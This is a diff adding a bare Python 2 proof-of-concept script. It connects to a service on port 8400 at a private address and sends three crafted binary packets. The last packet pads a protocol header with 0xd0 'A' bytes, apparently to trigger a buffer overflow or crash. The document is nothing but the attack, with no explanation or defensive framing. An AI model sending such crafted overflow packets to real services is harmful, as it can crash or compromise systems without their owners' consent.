@@ -1,0 +1,42 @@
+import socket
+import binascii
+import time
+import struct
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(1)
+s.connect(("10.101.0.85", 8400))
+
+def sr(p=None, r=None):
+        if p:
+                print "sending %d bytes: %s " % (len(p)/2,p)
+                payl = binascii.a2b_hex(p)
+                s.send(payl)
+        if r:
+                data = s.recv(1024*2)
+                print "received %d bytes: %s " % (len(data),binascii.b2a_hex(data))
+
+
+
+
+pkt1  = "0000003800000010000000100000000f00000000000000000000000000000000000000000000000000000000000000010000000000000000" 
+pkt1 += "0000100309000101090000000000ffe80000000800010000"
+pkt1 += "0000000400000004"
+
+pkt2  = "0000100309000509000000090000ffe800000036"+"00018016"
+pkt2 += "02000000"+"09050009"+"c14d4d0"+"000000000000000003a793102076376642e6578656a231a0200429d750500989796059c16e042"+"fd00b417" 
+
+
+pkt3  = "53534c634c6e54"+"01"+"000b"+"77696e323031322d303200"+"03"+"0000000300000001"
+p = "41"*0xd0 
+pkt3 += p
+
+sr(pkt1,1)
+sr(pkt2,1)
+sr(pkt3,1)
+exit()
+
+
+
+
+s.close()
